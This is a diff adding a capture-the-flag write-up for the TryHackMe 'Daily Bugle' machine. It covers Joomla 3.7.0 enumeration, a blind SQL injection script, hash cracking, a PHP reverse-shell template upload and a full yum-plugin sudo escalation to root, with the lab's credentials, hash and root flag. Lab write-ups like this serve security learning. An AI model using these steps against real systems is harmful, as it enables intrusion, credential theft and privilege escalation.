@@ -1,0 +1,79 @@
+information from : http://10.10.239.215/index.php
+  - Super User is jonah
+  - Spider-Man
+
+Nmap shows port 80 is running Joomla, there is a robots.txt which always holds some usefull information. It disallowed some directories.
+  i.e: /joomla/administrator/ /administrator/ /bin/ /cache/ 
+        | /cli/ /components/ /includes/ /installation/ /language/ 
+        |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+
+
+This machine is running Apache 2.4.6 on a CentOS machine, where PHP version is 5.6.40
+
+Nmap shows its running Joomla lets find which version it is running.
+from enumeration I found http://10.10.239.215/administrator/manifests/files/joomla.xml
+This XML contains joomla version number
+  - version="3.7.0"
+
+I found a this version is vulnerable to blind Sql injection.
+https://github.com/NinjaJc01/joomblah-3/blob/master/joomblah.py
+
+And this script extracted this information: 
+    -] Fetching CSRF token
+     [-] Testing SQLi
+    ('  -  Found table:', 'fb9j5_users')
+    ('  -  Extracting users from', 'fb9j5_users')
+    (' [$] Found user', ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''])
+    ('  -  Extracting sessions from', 'fb9j5_session')\
+
+Tried to analyse the hash. I used hasdID tool to identify the tool, and it said it is a:
+      hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
+        Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
+        [+] Blowfish(OpenBSD) 
+        [+] Woltlab Burning Board 4.x 
+        [+] bcrypt 
+
+I used hashcat to crack the password, password of the cracked hash is spiderman123
+
+Now i tried to login with that creds into the joomla cpanel.
+
+Here i uploaded a php reverse shell on the protostar templates which is an active templates of the website.
+
+Then got a reverse shell using netcat
+
+after the foothold, enumerated inside the /var/www/html dir and found a config file. Inside the config file got this creds.
+
+jjameson:nv5uz9r3ZEDzVjNu
+
+After ssh to jjameson user, I tried to look into it sudo permission.
+sudo -l  and I found (ALL) NOPASSWD: /usr/bin/yum
+
+I tried to find the way to escalate using yum. I found GTFO.bins git
+
+[jjameson@dailybugle ~]$ TF=$(mktemp -d)
+[jjameson@dailybugle ~]$ cat  >$TF/x<<EOF
+> [main]
+> plugins=1
+> pluginpath=$TF
+> pluginconfpath=$TF
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
+> [main]
+> enabled=1
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
+> import os
+> import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>   os.execl('/bin/sh','/bin/sh')
+> EOF
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# cd /root
+sh-4.2# ls
+anaconda-ks.cfg  root.txt
+sh-4.2# cat root.txt 
+eec3d53292b1821868266858d7fa6f79
